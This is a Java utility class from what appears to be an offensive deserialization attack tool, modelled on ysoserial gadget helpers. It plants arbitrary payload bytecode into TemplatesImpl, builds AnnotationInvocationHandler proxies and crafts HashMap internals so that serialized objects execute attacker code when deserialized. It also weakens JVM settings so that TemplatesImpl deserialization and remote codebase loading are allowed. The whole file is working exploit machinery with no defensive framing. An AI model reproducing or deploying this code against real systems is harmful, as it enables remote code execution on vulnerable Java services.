package com.summersec.attack.deser.util;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;





public class Gadgetsasm
{
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");


        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }



    public static <T> T createMemoitizedProxy(Map<String, Object> map, Class<T> iface, Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
        return (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(new Object[] { Override.class, map });
    }


    public static <T> T createProxy(InvocationHandler ih, Class<T> iface, Class<?>... ifaces) {
        Class<?>[] allIfaces = (Class[])Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgetsasm.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(String key, Object val) {
        Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl(byte[] classpayload) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(classpayload,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(classpayload, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }






    public static <T> T createTemplatesImpl(byte[] payload, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        T templates = tplClass.newInstance();



//        File file = new File("D:\\tools\\temp\\temp.class");
//
//        OutputStream os = new FileOutputStream(file);
//
//
//        os.write(payload);


        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bcField.setAccessible(true);
        bcField.set(templates, new byte[][] { payload });
        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "a");

        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Class<?> nodeC;
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", Integer.valueOf(2));

        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(new Class[] { int.class, Object.class, Object.class, nodeC });
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(new Object[] { Integer.valueOf(0), v1, v1, null }));
        Array.set(tbl, 1, nodeCons.newInstance(new Object[] { Integer.valueOf(0), v2, v2, null }));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}



